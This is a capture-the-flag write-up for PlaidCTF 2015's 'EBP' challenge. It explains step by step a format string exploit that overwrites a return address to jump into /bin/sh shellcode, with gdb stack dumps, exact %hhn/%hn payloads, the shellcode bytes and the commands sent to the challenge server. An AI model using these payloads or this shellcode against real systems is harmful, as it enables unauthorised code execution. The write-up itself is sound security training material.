**Name**: EBP  
**Points**: 160  
***Type**: Pwnable  
**Description**:  
nc 52.6.64.173 4545  
Download: [%p%o%o%p](http://play.plaidctf.com/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf).  
**Hints**: (none)  
**Files**: http://play.plaidctf.com/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf  
**CTF**: PlaidCTF 2015

#####

Right off the bat, we can see that this binary does nothing more than just echo back whatever you input. The first thing that comes to mind is "format string vulnerablity", and sure enough:
```
$ ./ebp
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
f76a2ada.f77a2440.0804a080.ffa1fe38.0804852c.00000001.00000000.0804a080.f77a1ff4.00000000.00000000.ffa1fe58.08048557.0804a080.00000400.f77a2440.f77a1ff4.08048580.00000000.ffa1fed8.f7658e46.00000001.ffa1ff04.ffa1ff0c.f77cb860.f77e4821.ffffffff.f77ecff4.080482b1.00000001.

```

Normally, we would now load up our exploit string, look for it on the stack, and use that to easily achieve arbitrary write. We do this by repeating "%08x." and look for stack values that contain "\x\x\x\x\x". Unfortunately, in this case (as we can see above), our string is not be placed on the stack, so we'll have to use another way of achieving our goal (which is to overwrite the return address of the function that calls the format string function).

In order to write where we want to write, we have to first get the target address somewhere on the stack. Then we can write to that address with the "%n" modifier.

Let's load up the binary in gdb and find the call to the format string function:
```
# gdb ebp -q
(gdb) disas main
Dump of assembler code for function main:
   0x08048547 <+0>: push   ebp
   0x08048548 <+1>: mov    ebp,esp
   0x0804854a <+3>: and    esp,0xfffffff0
   0x0804854d <+6>: sub    esp,0x10
   0x08048550 <+9>: jmp    0x8048557 <main+16>
   0x08048552 <+11>:    call   0x8048521 <echo>
   0x08048557 <+16>:    mov    eax,ds:0x804a040
   0x0804855c <+21>:    mov    DWORD PTR [esp+0x8],eax
   0x08048560 <+25>:    mov    DWORD PTR [esp+0x4],0x400
   0x08048568 <+33>:    mov    DWORD PTR [esp],0x804a080
   0x0804856f <+40>:    call   0x80483b0 <fgets@plt>
   0x08048574 <+45>:    test   eax,eax
   0x08048576 <+47>:    jne    0x8048552 <main+11>
   0x08048578 <+49>:    leave  
   0x08048579 <+50>:    ret    
End of assembler dump.
(gdb) disas echo
Dump of assembler code for function echo:
   0x08048521 <+0>: push   ebp
   0x08048522 <+1>: mov    ebp,esp
   0x08048524 <+3>: sub    esp,0x18
   0x08048527 <+6>: call   0x80484fd <make_response>
   0x0804852c <+11>:    mov    DWORD PTR [esp],0x804a480
   0x08048533 <+18>:    call   0x80483c0 <puts@plt>
   0x08048538 <+23>:    mov    eax,ds:0x804a060
   0x0804853d <+28>:    mov    DWORD PTR [esp],eax
   0x08048540 <+31>:    call   0x80483a0 <fflush@plt>
   0x08048545 <+36>:    leave  
   0x08048546 <+37>:    ret    
End of assembler dump.
(gdb) disas make_response
Dump of assembler code for function make_response:
   0x080484fd <+0>: push   ebp
   0x080484fe <+1>: mov    ebp,esp
   0x08048500 <+3>: sub    esp,0x18
   0x08048503 <+6>: mov    DWORD PTR [esp+0x8],0x804a080
   0x0804850b <+14>:    mov    DWORD PTR [esp+0x4],0x400
   0x08048513 <+22>:    mov    DWORD PTR [esp],0x804a480
   0x0804851a <+29>:    call   0x80483f0 <snprintf@plt>
   0x0804851f <+34>:    leave  
   0x08048520 <+35>:    ret    
```

The call is made from the function `make_response`, at address `0x0804851a`. We can set a breakpoint there are have a look at the stack before the call:
```
(gdb) break *0x0804851a
(gdb) run
test
Breakpoint 1, 0x0804851a in make_response ()
(gdb) x/32xw $esp
0xffffd440: 0x0804a480  0x00000400  0x0804a080  0xf7eb2ada
0xffffd450: 0xf7fb2440  0x0804a080  0xffffd478  0x0804852c
0xffffd460: 0x00000001  0x00000000  0x0804a080  0xf7fb1ff4
0xffffd470: 0x00000000  0x00000000  0xffffd498  0x08048557
0xffffd480: 0x0804a080  0x00000400  0xf7fb2440  0xf7fb1ff4
0xffffd490: 0x08048580  0x00000000  0xffffd518  0xf7e68e46
0xffffd4a0: 0x00000001  0xffffd544  0xffffd54c  0xf7fdb860
0xffffd4b0: 0xf7ff4821  0xffffffff  0xf7ffcff4  0x080482b1
```

We can see a couple of interesting things here:
- if we compare the values from gdb and those from simply executing the binary, we see different values. This indicates that ASLR is active, so that each execution, the addresses will be different. Thye might still be related though.
- `0x0804a080` occurs in both executions in the same spot. GDB tells us this is the address of the buffer that holds our format string. This is useful, because we can use this to store our shellcode and jump to the fixed address.
- `0x0804852c` also occurs in both executions. This is the return address of the function `make_response`; this is what we want to overwrite. It's at address `0xffffd45c` in GDB, but will change in actual execution.

# Step 1: Setting up the target address
Our first step is to get the target address on the stack. We can see some addresses that resemble the target address in GDB, but nothing that points exactly where we need it. Because we get to input multiple strings, we can just use a specially crafted format string to put the address we want on the stack, and deal with overwriting the target address later (see step 2). 

We are looking for a value on the stack that points to another value on the stack, that is close to our target address. I chose value `0xffffd478` at address `0xffffd458`, which would be the 4th format string argument. If we dereference that value, we see `0xffffd498` (close to our target address of `0xffffd45c`). Let's see if we can use that to write something to the stack (stack view is shown after call to format string function):
```
(gdb) run
%x%x%x%n
Breakpoint 1, 0x0804851a in make_response ()
(gdb) ni
(gdb) x/32xw $esp
0xffffd440: 0x0804a480  0x00000400  0x0804a080  0xf7eb2ada
0xffffd450: 0xf7fb2440  0x0804852c  0xffffd478  0x0804852c
0xffffd460: 0x00000001  0x00000000  0x0804a080  0xf7fb1ff4
0xffffd470: 0x00000000  0x00000000  0x00000017  0x08048557
0xffffd480: 0x0804a080  0x00000400  0xf7fb2440  0xf7fb1ff4
0xffffd490: 0x08048580  0x00000000  0xffffd518  0xf7e68e46
0xffffd4a0: 0x00000001  0xffffd544  0xffffd54c  0xf7fdb860
0xffffd4b0: 0xf7ff4821  0xffffffff  0xf7ffcff4  0x080482b1
```
Success, we have overwritten the value at `0xffffd47` with the value `0x17`. This is the first step of the puzzle. In the actual exploit, we'll refrain from overwriting the entire value, and just overwrite the least significant byte(s), using a format string length modifier: "h" overwrites 2 bytes, "hh" overwrites 1 byte. 

Ok, so we know how to overwrite that value; now we need to know what to overwrite it with (remember, ASLR means we can't rely on any addresses we get from GDB). The adresses of the stack might change, but they are still maintain the same relative distance to each other. The values `0xffffd478` and `0xffffd498` (from GDB) have the same difference as the values `0xffa1fe38`and `0xffa1fe58` (from normal execution above). This means we can calculate the target address from the values we see. In GDB, our chosen values is `0xffffd478` and the target address is `0xffffd45c`. If we can read that value during normal execution, we can get the target address by subtracting `0x1c` from it.

Finally, the format string to overwrite the last byte with an arbitrary value (let's say "ab") is: `%0171x%4$hhn`. The first part prints 171 (= `0xab`) characters to stdout, increasing the bytes written so far. The second part skips to the 4th argument ("4$") and overwrites the last byte ("hh") with the number of bytes written so far ("%n").  
Example:
```
$ ./ebp
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f7677ada.f7777440.0804a080.ffb35238.0804852c.00000001.00000000.0804a080.f7776ff4.00000000.00000000.ffb35258

%0171x%4$hhn
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f7677ada

%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f7677ada.f7777440.0804a080.ffb35238.0804852c.00000001.00000000.0804a080.f7776ff4.00000000.00000000.ffb352ab
```
The value that used to be `0xffb35258` is now `0xffb352ab`.

# Step 2: Overwriting the target address
The second part is using the address we put on the stack (at the 12th argument) to overwrite the target value. It currently holds the return address `0x0804852c`, but we want to point in to our buffer `0x0804a080`. Again, there's no need to overwrite the entire value, we just need to change the last 2 bytes. While we are overwriting this, we also have to include shellcode in the buffer. Luckily, this time we won't have to calculate any addresses, because the buffer address is constant. We can do a test run (without shellcode), but if we overwrite the return address, we'll need a core dump to verify if we've overwritten it correctly:
```
$ ulimit -c unlimited
$ ./ebp
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f76afada.f77af440.0804a080.ffc93e98.0804852c.00000001.00000000.0804a080.f77aeff4.00000000.00000000.ffc93eb8

%0124x%4$hhn
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f76afada

%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f76afada.f77af440.0804a080.ffc93e98.0804852c.00000001.00000000.0804a080.f77aeff4.00000000.00000000.ffc93e7c

%041088x%12$hn
Segmentation fault (core dumped)
$ gdb -q ebp core
Program terminated with signal 11, Segmentation fault.
#0  0x0804a085 in buf ()
(gdb) x/x 0xffc93e7c
0xffc93e7c: 0x0804a080
```
We read out the value `0xffc93e98` and subtract `0x1c`. The target address should be `0xffc93e7c`. We only need to overwrite the last byte `0x7c` (= 124). We want to change the last 2 bytes of the return address to `0xa080` (= 41088). After the 4th input, we predictably get a SEGFAULT. We check with GDB and our overwrite was successful.

# Step 3: Executing the exploit

The final difficulty is that on the one hand we need interactivity (because of ASLR) and on the other hand we need to be able to send over our shellcode. We can't just use netcat and we can't know the traget address, so sending all the info at once is also not possible. The solution is using *named pipes*, which are like files you can write to that input data to any program that's reading them. They can be created with the `mkfifo` command. Normally these pipes are closed after they've been written to, but there's a trick to keep them open and write to them repeatedly. After you're done using them, execute `ps aux | grep pipe` to find and kill any processes still keeping your pipe open:
##### Terminal 1
```
$ mkfifo pipe
$ cat > pipe &
$ cat pipe | ./ebp
test1

test2

```
##### Terminal 2
```
$ echo "test1" > pipe
$ echo "test2" > pipe
```

Shellcode:
`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

Now that everything's in order, let's get our flag:
##### Terminal 1
```
$ cat pipe | nc 52.6.64.173 4545
0000000a.00000001.f77b1000.ffd00e48.0804852c.ffd00e68.f77d4020.ffd00e94.f77b1000.00000000.00000000.ffd00e68.

0000000000000000000000000000000000000000000a

0000000a.00000001.00000000.ffd00e48.0804852c.f77b1ac0.f77d4020.ffd00e94.f77b1000.00000000.00000000.ffd00e2c.

problem

ebp
flag.txt

who_needs_stack_control_anyway?

```
##### Terminal 2
```
$ python -c 'print "%08x."*12' > pipe
$ python -c 'print "%044x%4$hhn"' > pipe
$ python -c 'print "%08x."*12' > pipe
$ python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"%041067x%12$hn"' > pipe
$ echo "whoami" > pipe
$ echo "ls /home/problem" > pipe
$ echo "cat /home/problem/flag.txt" > pipe

```
Just clarifying some details: we see the valuè0xffd00e48`, so after subtracting`0x1c`, we get target address ̀0xffd00e2c`. We'll need 44 (= `0x2c`) bytes in the first part of the first write. The second write value is the same as during step 2, but we also have to remember to account for our shellcode which is 21 bytes (we wrote 41088 bytes in step 2, so 41088-21 = 41067). Once we get a shell, we need to find the flag, but the user's home directory is usually a good place to start.

FLAG = who_needs_stack_control_anyway?